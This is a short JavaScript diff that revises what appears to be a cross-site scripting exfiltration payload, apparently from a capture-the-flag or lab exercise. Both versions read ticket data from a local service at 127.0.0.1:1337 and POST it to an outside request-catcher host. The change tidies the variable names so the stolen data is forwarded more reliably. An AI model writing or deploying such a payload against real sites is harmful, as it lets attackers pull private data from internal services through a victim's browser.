@@ -1,10 +1,10 @@
-const xhrr = new XMLHttpRequest();
-xhrr.open("GET", "http://127.0.0.1:1337/tickets",true);
+const xhr = new XMLHttpRequest();
+xhr.open("GET", "http://127.0.0.1:1337/tickets",true);
+xhr.send();
+var v = xhr.responseText;
 
-xhrr.send();
-v = xhrr.response;
-
-xhrr.open("POST", "https://lemon.requestcatcher.com/", true);
-xhrr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-data = v;
-xhr.send(data);
+let req = new XMLHttpRequest();
+req.open("POST", "https://lemon.requestcatcher.com/", true);
+req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+let data = v;
+req.send(data);
